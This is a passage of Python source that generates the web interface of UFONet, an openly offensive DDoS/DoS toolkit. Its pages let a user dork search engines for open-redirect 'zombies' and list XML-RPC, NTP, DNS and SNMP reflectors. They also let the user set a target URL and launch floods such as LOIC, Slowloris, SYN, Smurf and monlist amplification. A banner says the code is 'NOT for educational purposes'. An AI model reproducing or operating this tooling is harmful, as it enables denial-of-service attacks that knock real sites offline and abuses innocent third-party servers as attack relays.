-52px;-moz-transform-origin:50% -52px;-o-transform-origin:50% -52px;transform-origin:50% -52px;position:absolute;bottom:-102px;left:0}.ringMenu ul li.right{-webkit-transform-origin:-52px 50%;-moz-transform-origin:-52px 50%;-o-transform-origin:-52px 50%;transform-origin:-52px 50%;position:absolute;top:0;right:-102px}.ringMenu ul li.left{-webkit-transform-origin:152px 50%;-moz-transform-origin:152px 50%;-o-transform-origin:152px 50%;transform-origin:152px 50%;position:absolute;top:0;left:-102px}textarea{padding:30px 0}
</style>"""
        self.pages["/footer"] = """</center></body>
</html>
"""
        self.pages["/"] = self.pages["/header"] + """<script language="javascript">
      function Start() {
        var win_start = window.open("gui","_parent","fullscreen=yes, titlebar=yes, top=180, left=320, width=640, height=460, resizable=yes", false);
      }
</script>
<script type="text/javascript">
var text="REMEMBER -> This code is NOT for educational purposes!";
var delay=1;
var currentChar=1;
var destination="tt";
function type()
{
  if (document.getElementById)
  {
    var dest=document.getElementById(destination);
    if (dest)
    {
      dest.innerHTML=text.substr(0, currentChar);
      currentChar++
      if (currentChar>text.length)
      {
        currentChar=1;
        setTimeout("type()", 5000);
      }
      else
      {
        setTimeout("type()", delay);
      }
    }
  }
}
function startTyping(textParam, delayParam, destinationParam)
{
  text=textParam;
  delay=delayParam;
  currentChar=1;
  destination=destinationParam;
  type();
}
</script>
  <link rel="stylesheet" href="/js/ufo-cloud.css" />
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center><br><br><br><br>
<table><tr>
<td>
<div class="ufo-cloud">
        <ul>
            <li><a href="javascript:alert('Let them hate so long as they fear...');"><span></span>'oderint dum metuant'</a></li>
            <li><a href="javascript:alert('In order to achieve what has been undertaken...');"><span></span>'ad susceptum perficiendum'</a></li>
            <li><a href="javascript:alert('Out of order, comes chaos...');"><span></span>'chao ab ordo'</a></li>
            <li><a href="javascript:alert('The truth being enveloped by obscure things...');"><span></span>'obscuris vera involvens'</a></li>
            <li><a href="javascript:alert('Everything changes, nothing perishes...');"><span></span>'omnia mutantur, nihil interit'</a></li>
            <li><a href="javascript:alert('One world...');"><span></span>'orbis unum'</a></li>
            <li><a href="javascript:alert('If you want peace, prepare the war...');"><span></span>'si vis pacem, para bellum'</a></li>
            <li><a href="javascript:alert('Man is a wolf to man...');"><span></span>'homo homini lupus'</a></li>
            <li><a href="javascript:alert('Ignorance is the cause of fear...');"><span></span>'causa de timendi est nescire'</a></li>
            <li><a href="javascript:alert('There is still time...');"><span></span>'adhuc tempus'</a></li>
            <li><a href="javascript:alert('No regime is sustained for a long time exercising violence...');"><span></span>'iniqua nunquam regna perpetuo manent'</a></li>
            <li><a href="javascript:alert('From one, learn all...');"><span></span>'ab uno disce omnes'</a></li>
            <li><a href="javascript:alert('One for all, all for one...');"><span></span>'unus pro omnibus, omnes pro uno'</a></li>
            <li><a href="javascript:alert('Do what you are doing...');"><span></span>'age quod agis'</a></li>
            <li><a href="javascript:alert('Make your move...');"><span></span>'fac et excusa'</a></li>
            <li><a href="javascript:alert('Divide and conquer...');"><span></span>'divide et impera'</a></li>
            <li><a href="javascript:alert('If you did it, deny it...');"><span></span>'si fecisti nega'</a></li>
            <li><a href="javascript:alert('There is no law, if there is a need...');"><span></span>'necessitas caret lege'</a></li>
            <li><a href="javascript:alert('Let justice be done, and let the world perish...');"><span></span>'fiat iustitia, et pereat mundus'</a></li>
        </ul>
    </div>
</td>
<td><img src='data:image/png;base64,"""+self.ufonet_logo_img+"""'></td><td>
</td></tr></table><br>
<br /><b><a href="https://ufonet.03c8.net" target="_blank">UFONet</a></b> - is a /disruptive_toolkit/ that allows to perform <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> and <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DoS</a> attacks ...<br /><br />
<div id="tt">REMEMBER -> This code is NOT for educational purposes!</div><br />
<script type="text/javascript">
startTyping(text, 80, "tt");
</script><br />
<button title="Start Mothership..." onclick="Start()" style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">START MOTHERSHIP!</button>""" + self.pages["/footer"]

        self.pages["/gui"] = self.pages["/header"] + """<script>function News() {
        var win_requests = window.open("news","_blank","fullscreen=no, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Missions() {
        var win_requests = window.open("missions","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Stats() {
        var win_requests = window.open("stats","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Board() {
        var win_requests = window.open("board","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Links() {
        var win_requests = window.open("links","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Streams() {
        var win_requests = window.open("streams","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Games() {
        var win_requests = window.open("games","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Browser() {
        var win_browser = window.open("browser","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function GlobalNet() {
        var win_global_net = window.open("globalnet","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a target="_blank" href="wormhole">Wormhole</a></li>
  <li class="top"><a href="botnet">Botnet</a></li>
  <li class="right"><a href="inspect">Inspect</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="help">Help</a></li>
</ul>
</div>
 </td>
 <td>
<table border="1" bgcolor="black" cellpadding="24" cellspacing="25">
<tr>
<td>
<pre>Welcome to: <a href="https://ufonet.03c8.net/" target="_blank">UFONet</a> ;-)

----------------------------------
""" + self.options.version + """ 
 - Rel: """ + self.release_date + """ - Dep: """ + time.ctime(os.path.getctime('ufonet')) + """ 

 | <a href='javascript:runCommandX("cmd_check_tool")'>Update</a> | <a href="https://code.03c8.net/epsylon/ufonet" target="_blank">Code</a> - <a href="https://github.com/epsylon/ufonet" target="_blank">Mirror</a> | <a href='javascript:runCommandX("cmd_view_changelog")'>Logs</a> |

-----------------------------------

Mothership ID: <b>""" + str(self.mothership_id) + """</b>
 - Your ranking is: <a href="/ranking" target="_blank"><b>""" + str(self.ranking) + """</b></a>
"""+str(self.current_tasks)+"""</td>
<td>
 <table>
 <tr>
  <td>
  <table cellpadding="2" cellspacing="5">
    <tr>
<td align="right"><img src='data:image/png;base64,"""+self.alien1_img+"""' onclick="News()"><br><a href="javascript:News()">NEWS</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien2_img+"""' onclick="Missions()"><br><a href="javascript:Missions()">MISSIONS</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien5_img+"""' onclick="Stats()"><br><a href="javascript:Stats()">SHIP.STATS</a></td></tr><tr><td align="right"><img src='data:image/png;base64,"""+self.alien4_img+"""' onclick="Board()"><br><a href="javascript:Board()">SHIP.BOARD</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien10_img+"""' onclick="Links()"><br><a href="javascript:Links()">SHIP.LINKS</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien9_img+"""' onclick="javascript:Streams()"><br><a href="javascript:Streams()">SHIP.STREAMS</a></td></tr><tr><td align="right"><img src='data:image/png;base64,"""+self.alien12_img+"""' onclick="javascript:Games()"><br><a href="javascript:Games()">SHIP.GAMES</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien13_img+"""' onclick="javascript:Browser()"><br><a href="javascript:Browser()">SHIP.BROWSER</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien11_img+"""' onclick="GlobalNet()"><br><a href="javascript:GlobalNet()">GLOBAL.NET</a></td>
 </tr>
 </table>
 </td>
</tr>
</table>
</td>
</tr>
</table><center><br><br>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/botnet"] = self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Maps() {
        var win_map = window.open("cmd_view_army","_blank","fullscreen=yes, resizable=yes", false);
        win_map.resizeTo(screen.width,screen.height);
      }
function Start(){
        dork=document.getElementById("dork").value
        s_engine = document.getElementById('engines_list').options[document.getElementById('engines_list').selectedIndex].text;
        if (document.getElementById("autosearch").checked){
        document.getElementById("autosearch").value = "on";
        } else {
        document.getElementById("autosearch").value = "off";
        }
        autosearch = document.getElementById("autosearch").value
        if (document.getElementById("dork_list").checked){
        document.getElementById("dork_list").value = "on";
        } else {
        document.getElementById("dork_list").value = "off";
        }
        dork_list = document.getElementById("dork_list").value
        if(dork == "" && dork_list == "off" && autosearch == "off") {
          window.alert("You need to enter a source for dorking...");
          return
         }else{
          if (document.getElementById("all_engines").checked){
          document.getElementById("all_engines").value = "on";
          exclude_engines=document.getElementById("exclude_engines").value
          } else {
          document.getElementById("all_engines").value = "off";
          }
          all_engines = document.getElementById("all_engines").value
          params="autosearch="+escape(autosearch)+"&dork="+escape(dork)+"&dork_list="+escape(dork_list)+"&s_engine="+escape(s_engine)+"&all_engines="+escape(all_engines)+"&exclude_engines="+escape(exclude_engines)
        runCommandX("cmd_search",params)      
         }
      }
function showHide() 
     {
        if(document.getElementById("dork_list").checked) 
        {
         document.getElementById("dork_pattern").style.display = "none";
         document.getElementById("autosearch_pattern").style.display = "none";
        } 
        else {
         document.getElementById("dork_pattern").style.display = "";
         document.getElementById("autosearch_pattern").style.display = "";
        }
     }
function showHideEngines()
     {
        if(document.getElementById("all_engines").checked)
        {
         document.getElementById("s_engine").style.display = "none";
         document.getElementById("sex_engine").style.display = "";
        }
        else {
         document.getElementById("s_engine").style.display = "";
         document.getElementById("sex_engine").style.display = "none";
        }
     }
function HideAll() 
     {
        if(document.getElementById("autosearch").checked) 
        {
         document.getElementById("s_engine").style.display = "none";
         document.getElementById("dork_pattern").style.display = "none";
         document.getElementById("list_pattern").style.display = "none";
         document.getElementById("allengines_pattern").style.display = "none";
         document.getElementById("all_engines").checked = false;
         document.getElementById("dork_list").checked = false;
         document.getElementById("dork").value = "";
        } 
        else {
         document.getElementById("s_engine").style.display = "";
         document.getElementById("dork_pattern").style.display = "";
         document.getElementById("list_pattern").style.display = "";
         document.getElementById("allengines_pattern").style.display = "";
        }
     }
</script>
<script>function Blackholes() {
        var win_requests = window.open("blackholes","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="botnet">Botnet</a></li>
  <li class="top"><a href="help">Help</a></li>
  <li class="right"><a href="inspect">Inspect</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
<tr><td>
<pre>
 <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button> | * View Botnet: <button title="Build a map and geo-deploy your botnet on it..." onclick="Maps()">Generate map!</button>
<form method='GET'><br/><hr><div id="autosearch_pattern" style="display:block;">  
  * Search automatically (may take time!) <input type="checkbox" id="autosearch" onchange="HideAll()"></div><div id="dork_pattern" style="display:block;">  
  * Search using a dork: <input type="text" name="dork" id="dork" size="20" placeholder="proxy.php?url="></div><div id="list_pattern" style="display:block;">  
  * Search using a list (from: botnet/dorks.txt): <input type="checkbox" id="dork_list" onchange="showHide()"></div><div id="s_engine" name="s_engine" style="display:block;">  
  * Search using this search engine: <select id="engines_list">
  <option value="duck" selected>duck</option>
  <option value="bing">bing</option>
  <option value="yahoo">yahoo</option>
<!--  <option value="google">google (no TOR!)</option>-->
<!--  <option value="yandex">yandex</option>-->
  </select></div><div id="allengines_pattern" style="display:block;">
  * Search using all search engines: <input type="checkbox" name="all_engines" id="all_engines" onchange="showHideEngines()"></div><div id="sex_engine" name="sex_engine" style="display:none;">
  * Exclude this search engines: <input type="text" name="exclude_engines" id="exclude_engines" size="10" placeholder="Yahoo,Bing"></div></form>
  <button title="Start to search for zombies..." style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;" onClick=Start()>SEARCH!</button>
<br><hr>
  * Test Botnet: <br><br><center><a href='javascript:runCommandX("cmd_test_offline")'>Offline</a> | <a href='javascript:runCommandX("cmd_test_all")'>ALL</a> | <a href='javascript:runCommandX("cmd_test_army")'>Zombies</a> | <a href='javascript:runCommandX("cmd_test_rpcs")'>XML-RPCs</a> | <a href='javascript:runCommandX("cmd_attack_me")'>Attack Me!</a></center></td>
<td>
<table cellpadding="5" cellspacing="2">
<tr>
<td><table><tr><td><img src='data:image/png;base64,"""+self.alien3_img+"""' onclick="Blackholes()"></td></tr><tr><td align="right"><a href="javascript:Blackholes()">GLOBAL.WARPS</a></td></tr></table></td>
</tr>
<tr>
<table><tr>
<td>Total Botnet = <b><a href='javascript:runCommandX("cmd_list_army")'><font size='5'>"""+ self.total_botnet +"""</font></a></b></td>
</tr>
<tr><td><hr></td></tr>
<tr><td><table align="right"><tr><td>Zombies:</td><td><a href='javascript:runCommandX("cmd_list_zombies")'>"""+self.num_zombies+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>Aliens:</td><td><a href='javascript:runCommandX("cmd_list_aliens")'>"""+self.num_aliens+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>Droids:</td><td><a href='javascript:runCommandX("cmd_list_droids")'>"""+self.num_droids+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>UCAVs:</td><td><a href='javascript:runCommandX("cmd_list_ucavs")'>"""+self.num_ucavs+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>XML-RPCs:</td><td><a href='javascript:runCommandX("cmd_list_rpcs")'>"""+self.num_rpcs+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>NTPs:</td><td><a href='javascript:runCommandX("cmd_list_ntps")'>"""+self.num_ntps+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>DNSs:</td><td><a href='javascript:runCommandX("cmd_list_dnss")'>"""+self.num_dnss+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>SNMPs:</td><td><a href='javascript:runCommandX("cmd_list_snmps")'>"""+self.num_snmps+"""</a></td></tr></table></td></tr>
</table>
</table>
</td>
</tr></table>
</td>
</tr></table>
<hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/attack"] = self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Grid() {
        var win_requests = window.open("grid","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Wargames() {
        var win_requests = window.open("wargames","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function ShowPanel() {
        if (document.getElementById("extra_attack").checked){
               document.getElementById("extra_panel").style.display = "block";
               document.getElementById("loic").value = "";
               document.getElementById("loris").value = "";
               document.getElementById("ufosyn").value = "";
               document.getElementById("spray").value = "";
               document.getElementById("smurf").value = "";
               document.getElementById("xmas").value = "";
               document.getElementById("nuke").value = "";
               document.getElementById("tachyon").value = "";
               document.getElementById("monlist").value = "";
               document.getElementById("fraggle").value = "";
               document.getElementById("sniper").value = "";
               document.getElementById("ufoack").value = "";
               document.getElementById("uforst").value = "";
               document.getElementById("droper").value = "";
               document.getElementById("overlap").value = "";
               document.getElementById("pinger").value = "";
               document.getElementById("ufoudp").value = "";
               document.getElementById("dbstress").value = "";
             } else {
               document.getElementById("extra_panel").style.display = "none";
               document.getElementById("loic").value = "";
               document.getElementById("loris").value = "";
               document.getElementById("ufosyn").value = "";
               document.getElementById("spray").value = "";
               document.getElementById("smurf").value = "";
               document.getElementById("xmas").value = "";
               document.getElementById("nuke").value = "";
               document.getElementById("tachyon").value = "";
               document.getElementById("monlist").value = "";
               document.getElementById("fraggle").value = "";
               document.getElementById("sniper").value = "";
               document.getElementById("ufoack").value = "";
               document.getElementById("uforst").value = "";
               document.getElementById("droper").value = "";
               document.getElementById("overlap").value = "";
               document.getElementById("pinger").value = "";
               document.getElementById("ufoudp").value = "";
               document.getElementById("dbstress").value = "";
             }
      }
function Maps() {
         var win_map = window.open("/cmd_view_attack?target="+target,"_blank","fullscreen=yes, resizable=yes", false);
         win_map.resizeTo(screen.width,screen.height);
      }
function Start(){
        document.getElementById("attack_button").text = "STOP!"
        document.getElementById("attack_button").style = "color:red; height:40px; width:240px; font-weight:bold; background-color:yellow; border: 2px solid red;"
	target=document.getElementById("target").value
        String.prototype.startsWith = function(prefix){
        return this.indexOf(prefix) === 0;
        }
        if(target.startsWith("http")){
             path=document.getElementById("path").value
             rounds=document.getElementById("rounds").value
             dbstress=document.getElementById("dbstress").value
             loic=document.getElementById("loic").value
             loris=document.getElementById("loris").value
             ufosyn=document.getElementById("ufosyn").value
             spray=document.getElementById("spray").value
             smurf=document.getElementById("smurf").value
             xmas=document.getElementById("xmas").value
             nuke=document.getElementById("nuke").value
             tachyon=document.getElementById("tachyon").value
             monlist=document.getElementById("monlist").value
             fraggle=document.getElementById("fraggle").value
             sniper=document.getElementById("sniper").value
             ufoack=document.getElementById("ufoack").value
             uforst=document.getElementById("uforst").value
             droper=document.getElementById("droper").value
             overlap=document.getElementById("overlap").value
             pinger=document.getElementById("pinger").value
             ufoudp=document.getElementById("ufoudp").value
             if(ufosyn || spray || smurf || xmas || nuke || tachyon || monlist || fraggle || sniper || ufoack || uforst || droper || overlap || pinger || ufoudp){ // root required!
               window.alert("You need 'root' access!. Check shell and enter your password.");
             }
             params="path="+escape(path)+"&rounds="+escape(rounds)+"&target="+escape(target)+"&dbstress="+escape(dbstress)+"&loic="+escape(loic)+"&loris="+escape(loris)+"&ufosyn="+escape(ufosyn)+"&spray="+escape(spray)+"&smurf="+escape(smurf)+"&xmas="+escape(xmas)+"&nuke="+escape(nuke)+"&tachyon="+escape(tachyon)+"&monlist="+escape(monlist)+"&fraggle="+escape(fraggle)+"&sniper="+escape(sniper)+"&ufoack="+escape(ufoack)+"&uforst="+escape(uforst)+"&droper="+escape(droper)+"&overlap="+escape(overlap)+"&pinger="+escape(pinger)+"&ufoudp="+escape(ufoudp)
             if (document.getElementById("visual_attack").checked){
                document.getElementById("visual_attack").value = "on";
             } else {
                document.getElementById("visual_attack").value = "off";
             }
             if(document.getElementById("visual_attack").value=="on"){
                Maps() 
             }
        }else{
          window.alert("You need to enter a valid url: http(s)://target.com");
          return
        }
	runCommandX("cmd_attack",params)
}
</script>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="attack">Attack</a></li>
  <li class="top"><a href="help">Help</a></li>
  <li class="right"><a href="botnet">Botnet</a></li>
  <li class="bottom"><a href="inspect">Inspect</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
<tr><td>
<pre>
  * Set your target:     <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">

  * Set place to attack: <input type="text" name="path" id="path" size="30" placeholder="/path/big.jpg">

  * Number of rounds:    <input type="text" name="rounds" id="rounds" size="5" value="1">

<hr>
  <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button> | <input type="checkbox" name="visual_attack" id="visual_attack"> Generate map! | <input type="checkbox" name="extra_attack" id="extra_attack" onclick='javascript:ShowPanel();'> Extra(s)

<hr><div id="extra_panel" style="display:none;">
<table bgcolor="black" cellpadding="4" cellspacing="5" border="1"><tr>
<td align="left">* <a href="https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon" target="_blank">LOIC</a>:</td><td align="right">   <input type="text" name="loic" id="loic" size="4" placeholder="100"></td>
<td align="left">* <a href="https://en.wikipedia.org/wiki/Slowloris_(software)" target="_blank">LORIS</a>:</td><td align="right">  <input type="text" name="loris" id="loris" size="4" placeholder="101"></td>
<td align="left">* <a href="https://en.wikipedia.org/wiki/SYN_flood" target="_blank">UFOSYN</a>:</td><td align="right"> <input type="text" name="ufosyn" id="ufosyn" size="4" placeholder="100"></td>
<td align="left">* <a href="https://en.wikipedia.org/wiki/Fraggle_attack" target="_blank">FRAGGLE</a>:</td><td align="right"> <input type="text" name="fraggle" id="fraggle" size="4" placeholder="101"></td>
</tr><tr>
<td align="left">* <a href="https://ddos-guard.net/en/terminology/attack_type/rst-or-fin-flood" target="_blank">UFORST</a>:</td><td align="right"> <input type="text" name="uforst" id="uforst" size="4" placeholder="101"></td>
<td align="left">* <a href="https://en.wikipedia.org/wiki/DRDOS" target="_blank">SPRAY</a>:</td><td align="right">  <input type="text" name="spray" id="spray" size="4" placeholder="110"></td>
<td align="left">* <a href="https://en.wikipedia.org/wiki/Smurf_attack" target="_blank">SMURF</a>:</td><td align="right">  <input type="text" name="smurf" id="smurf" size="4" placeholder="100"></td>
<td align="left">* <a href="https://en.wikipedia.org/wiki/Christmas_tree_packet" target="_blank">XMAS</a>:</td><td align="right">   <input type="text" name="xmas" id="xmas" size="4" placeholder="111"></td>
</tr><tr>
<td align="left">* <a href="https://en.wikipedia.org/wiki/IP_fragmentation_attack" target="_blank">DROPER</a>:</td><td align="right">   <input type="text" name="droper" id="droper" size="4" placeholder="101"></td>
<td align="left">* <a href="https://www.imperva.com/learn/application-security/snmp-reflection/" target="_blank">SNIPER</a>:</td><td align="right">   <input type="text" name="sniper" id="sniper" size="4" placeholder="100"></td>
<td align="left">* <a href="https://www.us-cert.gov/ncas/alerts/TA13-088A" target="_blank">TACHYON</a>:</td><td align="right">   <input type="text" name="tachyon" id="tachyon" size="4" placeholder="100"></td>
<td align="left">* <a href="https://www.cloudflare.com/learning/ddos/ping-icmp-flood-ddos-attack/" target="_blank">PINGER</a>:</td><td align="right">   <input type="text" name="pinger" id="pinger" size="4" placeholder="101"></td>
</tr><tr>
<td align="left">* <a href="https://www.us-cert.gov/ncas/alerts/TA14-013A" target="_blank">MONLIST</a>:</td><td align="right">   <input type="text" name="monlist" id="monlist" size="4" placeholder="101"></td>
<td align="left">* <a href="https://www.f5.com/services/resources/glossary/push-and-ack-flood" target="_blank">UFOACK</a>:</td><td align="right">   <input type="text" name="ufoack" id="ufoack" size="4" placeholder="100"></td>
<td align="left">* <a href="https://cyberhoot.com/cybrary/fragment-overlap-attack/" target="_blank">OVERLAP</a>:</td><td align="right">   <input type="text" name="overlap" id="overlap" size="4" placeholder="100"></td>
<td align="left">* <a href="https://en.wikipedia.org/wiki/UDP_flood_attack" target="_blank">UFOUDP</a>:</td><td align="right">   <input type="text" name="ufoudp" id="ufoudp" size="4" placeholder="101"></td>
</tr><tr>
<td align="left">* <a href="https://dl.packetstormsecurity.net/papers/general/tcp-starvation.pdf" target="_blank">NUKE</a>:</td><td align="right">   <input type="text" name="nuke" id="nuke" size="4" placeholder="1001"></td>
</tr>
</table>
<hr>
  * Set db stress parameter:   <input type="text" name="dbstress" id="dbstress" size="22" placeholder="search.php?q=">

<hr></div>
  <button title="Start to attack your target..." onClick=Start() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;" id="attack_button">ATTACK!</button> | Total Botnet = <b><a href='javascript:runCommandX("cmd_list_army")'><font size='5'>"""+ self.total_botnet +"""</font></a></b></pre>
</td><td>
<table><tr><td><table><tr><td><img src='data:image/png;base64,"""+self.alien6_img+"""' onclick="Grid()"></td></tr><tr><td align="right"><a href="javascript:Grid()">GLOBAL.GRID</a></td></tr></table></td></tr><tr><td><table><tr><td><img src='data:image/png;base64,"""+self.alien8_img+"""' onclick="Wargames()"></td></tr><tr><td align="right"><a href="javascript:Wargames()">GLOBAL.WARGAMES</a></td></tr></table></td></tr></table>
</td></tr></table>
 </td></tr></table>
<hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/help"] = self.pages["/header"] + """<script language="javascript"> 
function show(one) {
      var nb = document.getElementsByTagName("div");
            for(var x=0; x<nb.length; x++) {
                  name = nb[x].getAttribute("class");
                  if (name == 'nb') {
                        if (nb[x].id == one) {
                        nb[x].style.display = 'block';
                  }
                  else {
                        nb[x].style.display = 'none';
                  }
            }
      }
}
</script>
<style>.container{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;}svg{max-width:8rem;}.masking{-webkit-transform: scale(0);transform:scale(0);-webkit-transform-origin:178px;transform-origin:178px;-webkit-animation: scale 3s linear infinite; animation: scale 3s linear infinite;}@-webkit-keyframes scale{80%{opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}@keyframes scale{80% {opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}</style>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="help">Help</a></li>
  <li class="top"><a href="botnet">Botnet</a></li>
  <li class="right"><a href="inspect">Inspect</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<table cellpadding="24" cellspacing="25" border="1">
<tr>
<td>
<a href="javascript:alert('DAIALAFSÄ & LUÄRKS says: Hi! """ + self.ranking + """, The first steps are easy ... RTFM! ;-)');"><img src='data:image/png;base64,"""+self.aliens_img+"""'></a>
</td>
<td><pre>
<div><a id="mH1" href="javascript:show('nb1');" style="text-decoration: none;" >+ Project info</a></div>
<div class="nb" id="nb1" style="display: none;">  <b>UFONet</b> - is a set of tools designed to launch <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> and <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DoS</a> attacks
            and that allows to combine both in a single offensive.
   </div><div><a id="mH2" href="javascript:show('nb2');" style="text-decoration: none;" >+ How does it work?</a></div> <div class="nb" id="nb2" style="display: none;">  You can read more info on next links:

      - <a href="https://cwe.mitre.org/data/definitions/601.html" target="_blank">CWE-601:Open Redirect</a>
      - <a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_URL_Redirector_Abuse2" target="_blank">OWASP:URL Redirector Abuse</a>
      - <a href="https://ufonet.03c8.net/ufonet/ufonet-schema.png" target="_blank">UFONet:Botnet Schema</a></div> <div><a id="mH3" href="javascript:show('nb3');" style="text-decoration: none;" >+ How to start?</a></div> <div class="nb" id="nb3" style="display: none;">  All you need to start an attack is:
   
      - a list of '<a href="https://en.wikipedia.org/wiki/Zombie" target="_blank">zombies</a>'; to conduct their connections to your target
